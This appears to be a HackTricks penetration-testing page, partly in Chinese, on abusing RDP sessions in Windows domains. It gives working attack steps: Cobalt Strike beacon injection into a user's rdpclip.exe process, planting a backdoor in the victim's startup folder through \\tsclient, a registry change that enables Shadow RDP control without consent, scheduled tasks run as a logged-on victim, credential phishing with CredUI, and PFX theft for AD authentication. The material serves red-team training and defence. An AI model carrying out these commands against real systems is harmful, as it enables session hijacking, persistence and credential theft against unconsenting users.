# RDP 会话滥用

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

如果 **external group** 拥有对当前域中任何 **computer** 的 **RDP access**，**attacker** 可以 **compromise that computer and wait for him**。

一旦该用户通过 RDP 访问，**attacker can pivot to that users session** 并在外部域滥用其权限。
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
查看 **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

如果用户通过 **RDP into a machine** 访问，并且那台机器上有一个 **attacker** 正在 **waiting** 等他，**attacker** 将能够 **inject a beacon in the RDP session of the user**，并且如果 **victim mounted his drive** 在通过 RDP 访问时，**attacker could access it**。

在这种情况下，你可以通过在 **statup folder** 中写入一个 **backdoor** 来简单地 **compromise** 该 **victims** **original computer**。
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

如果你是受害主机上的 **local admin**，且该主机上受害者已有 **active RDP session**，你可能能够 **view/control that desktop without stealing the password or dumping LSASS**。

这取决于存储在以下位置的 **Remote Desktop Services shadowing** 策略：
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
常见值：

- `0`: 已禁用
- `1`: `EnableInputNotify` (可控制，需要用户批准)
- `2`: `EnableInputNoNotify` (可控制，**无需用户批准**)
- `3`: `EnableNoInputNotify` (仅查看，需要用户批准)
- `4`: `EnableNoInputNoNotify` (仅查看，**无需用户批准**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
这在通过 RDP 连接的特权用户将未上锁的桌面、KeePass 会话、MMC 控制台、浏览器会话或 admin shell 留开时尤其有用。

## 已登录用户的计划任务

如果你是 **本地管理员** 且目标用户 **当前已登录**，任务计划程序可以以该用户的身份 **在无需其密码** 的情况下启动代码。

这会将受害者现有的登录会话转换为一个执行原语：
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
注意事项：

- 如果用户 **未登录**，Windows 通常需要密码来创建以该用户身份运行的任务。
- 如果用户 **已登录**，该任务可以重用现有的登录上下文。
- 这是一种在不接触 LSASS 的情况下，在受害者会话内执行 GUI 操作或启动二进制程序的实用方法。

## CredUI 提示滥用（来自受害者会话）

一旦你可以在**受害者的交互式桌面内执行**（例如通过 **Shadow RDP** 或 **以该用户身份运行的 scheduled task**），你就可以使用 CredUI APIs 显示一个**真实的 Windows 凭据提示**，并收集受害者输入的凭据。

相关 APIs：

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

典型流程：

1. 在受害者会话中启动一个二进制程序。
2. 显示一个与当前域品牌相匹配的域身份验证提示。
3. 解包返回的 auth buffer。
4. 验证提供的凭据，并可选择性地持续提示，直到输入有效凭据为止。

这对**on-host phishing** 很有用，因为提示由标准 Windows APIs 渲染，而不是伪造的 HTML 表单。

## 在受害者上下文中请求 PFX

相同的 **scheduled-task-as-user** 原语可用于以**已登录受害者**的身份请求证书/PFX。该证书随后可用于作为该用户进行 **AD authentication**，完全避免窃取密码。

高层流程：

1. 在受害者已登录的主机上获得 **local admin** 权限。
2. 以受害者身份使用 **scheduled task** 运行证书申请/导出逻辑。
3. 导出生成的 **PFX**。
4. 使用 PFX 进行 PKINIT / 基于证书的 AD 认证。

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
